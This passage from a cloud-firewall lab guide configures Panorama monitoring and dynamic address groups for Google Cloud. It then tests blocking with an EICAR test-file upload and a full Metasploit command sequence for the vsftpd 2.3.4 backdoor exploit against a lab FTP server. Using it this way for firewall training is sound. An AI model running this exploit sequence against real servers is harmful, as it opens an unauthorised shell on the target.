![](https://lh3.googleusercontent.com/UcSFkav5L9AOD4-j074JAE2C934vYQ9Mmnllcb0BHlZZ-XBvrBoLeK9F9_s9wLOQTfYoFy35IUoen7hLIrZxAF9p_QAjnRZxM2r9ABXcpOFxEWxQhbb1JSCVkQhGyGUtAfUwTj57hvNd_PhuZ11uEgk)

68. Move on to Notify Group and click on “Add”.

    1. In the Name field, enter “multicloud-lab-notify-group”
    2. Check both the Device Groups in the list and click on OK.

![](https://lh5.googleusercontent.com/nR36ZS0qazWSRkIX-z3pmKKrj7C9dmfHm3iAIRFU-1ATRd2oDAJTQKlDixXTsDfJbyQseVdpziESvQ1QGXwysFoCmms7_vFgI1A44xob5tkUfNzT1qcVM61XLiwk8DyrYAk3YsUIUNbsi5mlQa2F3i0)

69. Now, under Google Cloud Plugin, click on “Monitoring Definition” and then click on “Add”.

    1. In the Name field, enter “multicloud-lab-mon-def”
    2. Select the Service Account and Notify Group that you created in the previous steps and click on OK.

70. Commit to Panorama.

71. Once the Commit is completed successfully, we can see the Status on the Monitoring Definition says “Success” and clicking on “Details” will display the “Google Cloud Project ID” that you are working on. It takes around 3 mins to complete.

72. Once the Monitoring Definition is set up successfully, navigate to the _Objects_ tab on the Panorama and select _Address Groups_ from the left menu.
73. On the page, Click _Add_. On the New DAG form that pops up, enter the details as mentioned below.

    1. In the Name field, enter "gcp-dag".
    2. Check the "Shared" checkbox.
    3. From the dropdown list for Type, select "Dynamic".
    4. Click on "Add Match Criteria".
    5. On the side pane that pops up, on the search bar, type "subnet" and hit Enter.
    6. From the list that shows up, choose "google.subnet-name.multicloud-lab-us-central1-spoke1".
    7. Click Ok.

![DAG Form](/labs/multi-cloud/images/dag-form.png)

![DAG Form Extended](/labs/multi-cloud/images/dag-form-ext.png)

74. Commit the changes to Panorama.
75. Once the Commit has completed successfully, we can check the new DAG created and click on "more..." in the same row. That should show the IPs associated with the chosen tag on the DAG.

![DAG](/labs/multi-cloud/images/dag.png)

<br/><br/>

# Activity 2: Securing against C&C

In this section, we will attempt to upload a malware sample to the FTP server deployed on AWS and see how the threat is detected and blocked in real-time.

76. Navigate to the GCP Console and Login to the GCP Spoke VM by clicking on “SSH” on the VM Instance entry on the GCP console.

![](https://lh5.googleusercontent.com/ajAqXMnelYKVcpZD3AgsPuu5dfupskRhysY1yjFEvrKphCEcBSecHZIyk5M8xXLnJkiyjDsrfmIW-RD3Pok8PMImMDbpLcN1CKrD-SLusdiWBPzHa26ZpFAC_xZuV3A8lEEiryUCQLfrMn1EGDOGw5Q)

77. Run the below command to download the malware sample.

```
wget http://www.eicar.org/download/eicar.com.txt
```

**Note:** This is a sample malware download. If this download does not go through, it was then blocked by the firewall. In such case, we can skip this activity, but take a look at the restricted activity on the "Monitor" tab on the Panorama.

78. Login to the FTP server by following the below steps;

```
ftp 10.1.1.100

Enter username as “ftpuser”
Enter password as “ftpuser”
```

![](https://lh5.googleusercontent.com/lTC733SA1b7nfSd7oNcP7mqH6SaNzMgxDtt8Cvksuvfa6CyB9EmivFk9_7eqSFkAzw_kKfhaAk1zl-obXZe4EDb700kXOUI0d-_7hf29EDXbvbadXmvE6UXw17mbMIZ7nz3CQ0FzJ2vyiYCf7Y75kLE)

```
put eicar.com.txt
```

![](https://lh3.googleusercontent.com/3Q2kXwZx1D58pKOeGRPgaZXQQLLNKxOktdhFrTaZ0jGDsIh9XjEq-2JeT4Gv7L9xpdC-WEMru1gmgJsUucsEs4fXZlXyMZrjkX3YNk4S6fFsYyhn8M77SeTqX8JLSym1e1wDmojB1CYPmxbCf2obAOk)

**Note:** This step will fail because the malware will be detected and blocked by the VM-Series NGFW.

79. Check the logs on the Panorama under the Monitor tab.

![](https://lh6.googleusercontent.com/9PExkxqSR0xG1kexucEIZmHCxrD6oIGaYGUbMrvsKDTKO3WTkSJc1hBhqMi4CLxU7Z3rmRLLCnI5ciQHIb6t5fE3p9-MSAJXwFy7Dn-SHpBsnCrz6ONXDH4wpFAb6Ta5QXen7CdC0Nzdl_-4CbLfCCQ)

<br/><br/>

# Activity 3: Securing against Zero Day Vulnerabilities

In this section, we will attempt to exploit a FTP vulnerability, vsftpd_234_backdoor, on the FTP server deployed on AWS and see how the attack is blocked by the VM-Series NGFW.

## Connecting to the app servers

We will be using the user ‘ec2-user’ as the username to login to these applications.

### On the AWS EC2 Console

80. Navigate to the AWS EC2 console, select the instance that you want to connect to and click on “Connect”. Ensure that the user name is “ec2-user”

![](https://lh6.googleusercontent.com/oa6Da-6Eam53YUVh1SgqHAHGuV5zIw1fb3XLIwFGX2CegUb0zRM3cyvTtQ9mp0GLpTDDAv-22pi5iu2lZw230qaZOQk8Vh-J9YiePBkqzxFQQKceSnAVxKXMeBrTI1s8_p6PuBTK00MHqNmliNObOls)

![](https://lh5.googleusercontent.com/DYZbIL0xW_0EXsHGryynGBCpCDViPDKgtDlp20oJ1DsV27IDx61dyBbiZ8k2V1gHfUcGAHPMeAHx7MGKZoSiezrolMfYJvIaaAu6wldIxbUYmjXn6OiEQjdp6bj9e7EK7Z2hQU8H1SskLwx0xbjbTpY)

### Using the PEM file

If connecting via the AWS EC2 console does not work, you could try the below two options as well.

81. Launch terminal on your MAC.
82. Navigate to the folder where the pem keys were downloaded to.

```
cd ~/Downloads
```

83. Substitute qwikLABS-\*\*\*\*.pem with the PEM key that you downloaded and run the command below

```
chmod 400 qwikLABS-****.pem
```

84. Substitute qwikLABS-\*\*\*\*.pem with the PEM key that you downloaded and run the command below.  Username is ‘ec2-user’. IP Address is the public IP address of the ‘qwikLABS-vul-app-server’ that we noted in the previous step.

```
ssh -i qwikLABS-****.pem ec2-user@<vul-app-public-ip>
```

For example:

![](https://lh6.googleusercontent.com/ulQz4of2Lfn1iAsbmy9J4YXfXg3_UkbeEx7tRrjHu8uZJqTX6yQ5NTRUlzuKNvSYuwGldLCo6_8wOmUeBIrTsvBffE3Zf68iGRh5x34_UqlJe4fKgEN1rWlKYBKfBeGza0x4iyagGTlJO9jhoA)

### Using the PPK file

If you are using PuTTY to connect to the servers, after opening the putty, 

85. On the Category menu on the left, expand SSH and click on Auth.
86. In the field to select the Private key file for authentication, browse for the downloaded PPK file and select it.

![](https://lh3.googleusercontent.com/aAAvPXmenQ-cHpAP6BzLKgKM6tXguUbnSkLc427HE8J8UsNSl9TlM4E2Q7TxQTGKRsF6B-BXpd2R6tbmLP1tmoj9v9B8NSGmqpOMCCz7RmQNc676n5Lmo088qYnHiUiVkNH4O-0uk2kyaHxxzA)

87. Within the same PuTTY window, on the Category menu on the left, click on Session and provide the Public IP Address of the vul-app server as shown below.
88. Click “Open” to connect to the server.

![](https://lh4.googleusercontent.com/wmz5MlxioKGCl8qp_kP9XFMkw-TPGuz6BvKrFsxolNeKNBUo5wDvDVoPMOX6OQlUyoIw4UX579VHkBdtpeA740jsXqawYvtaK2u32kj9K04MEw1HXCAl7qfOtQD7wKZ75Qbgg9nuFEpc_01W1g)

## Exploiting the FTP vulnerability

89. Navigate to the AWS EC2 console, select the “multicloud-lab-ftp-client” instance and click on “Connect”.

![](https://lh4.googleusercontent.com/V14BMooYc9fogzheQhQ-I9zx5VSPddpupV9Iq5KxM98yNl6c2_EKJK-lnVAEkAtO_4kCoV-tPYHorTUUdIPQC3BG73TLI_y2mg-qrPcaLlvsXbLn3xiOqPzNtuIj-oHkL3mvGcX1pcuPzR1YZdRcDeE)

![](https://lh3.googleusercontent.com/Ri6ALeWCmpwRq34ueclMLkSyeOBNF8jfKfbY4iEi8fnBD6Hh0UnIVru0at2Gf60SwP26L5X1nE7gJ-ISsSxFTLPGgdUH1pkEBtmWLEzQw2AAKGUpf_nRfL-7jtGd1QI30gZbaTugLPxYx9_1MpxuApI)

90. Once you are logged in, run the following commands to carry out the attack.

```
msfconsole
```

![](https://lh3.googleusercontent.com/f8oOtDzlJZdSFDG-NgEo_54B0qXvTpgHX62ebCnXXekTA5eizLdwkYX65AVE2oKgaun0aO4n737lG_uyurlIhU4gWbwjEP_YAcj4P1Yxz50qVDr6bURWBEtdGN9fR_3x6sCuyeCTUG-GezKTdxiOHeE)

```
search vsftpd
```

![](https://lh5.googleusercontent.com/_AfoNfpkbwg8QYV9Av8bXsXmj3Pq5rqOObD-NUtI9ulHTKbOqC16KWuUns079ZYXcciMjLgoIFnJAjh5T-SL9D-PiGErhx9Hl1uP-oStCV5cKOEUffwXEEMounXRzyZxDts58Uux6usiEpfSiVVLGD4)


```
use exploit/unix/ftp/vsftpd_234_backdoor

set RHOST 10.1.1.100

set RPORT 21

show payloads
```

![](https://lh6.googleusercontent.com/RWzTmpZQJ-X2uXQnkDFAbB07NzZJix2hC7y8rs8EHDAzdtTnw8zlEpLN9xIq0oU3UxQ8LhI6SUJwFx9IPfhcAmI3vBUEAilxZ18JSb3VxrfntNX7I6KUahxuKVQGCqLEfQFTgrOx_jAW5FLmKTy3vwQ)

```
set payload payload/cmd/unix/interact
```

**Note:** The payload should be copied from the value under “Name” column in the output of the “show payloads” command.

```
exploit
```

![](https://lh5.googleusercontent.com/9wFU0dyU2l-ABoep6Hmljl_dYHNgExfvwaMyHF-waYYCh64M9Q8-I3iSwL3VQa_ZeiOBtWqNIuifx_Z2o4zuuscij6pYjEj_jHY6GetZlyK5G-zPACxYlmrlDHcNGBvk0IfWhn463u3VCFIFGxUPmiY)

As seen in the above image, the exploit did not go through as the NGFW blocked it. The logs can now be seen on the Panorama.

91. Traffic and Threat Logs on Panorama

![](https://lh6.googleusercontent.com/jMJ1eePtne9Ow9MyCpEIIot6k9_GLi7izjNa2W7YVPnLPIaqBMn0gWNKr5R4lfqA88tnM7V41CW2Z4LwoeZ7togyMOQNMr15u-rYU2x-NMcS0rs9EewyoqI5nptbkWAI-aWSxawq1hbNg_ApsCusRgQ)

![](https://lh6.googleusercontent.com/R-iu1lB_4ZJF0mPVwQluPAzofxkHcsy8jNiyocrLpepUUyHzHTAYiTtQfbc36wsicJvqnGUmg03AzFLgiy3t4LbvpG-b7GTQ05OPs_JfrGSfo5675sh_JDq-8zPHVKKOZzzTMA8fyebOoMohwlPSLb4)

<br/><br/>

# Activity Final Thoughts

Through this workshop, we learned how easy it is to deploy Palo Alto Networks recommended architectures for the Cloud using automation. We also saw how Panorama can be used as a single pane of glass as a management plane for Palo Alto NGFWs across the Hybrid Multi Cloud environments. We also looked at how consistent security posture can be applied on the ever-changing dynamic cloud environments from Day 0 through the use of DAGs. Finally, we saw the best of Palo Alto Networks at work as we secured our multi-cloud environment against Zero Day threats.
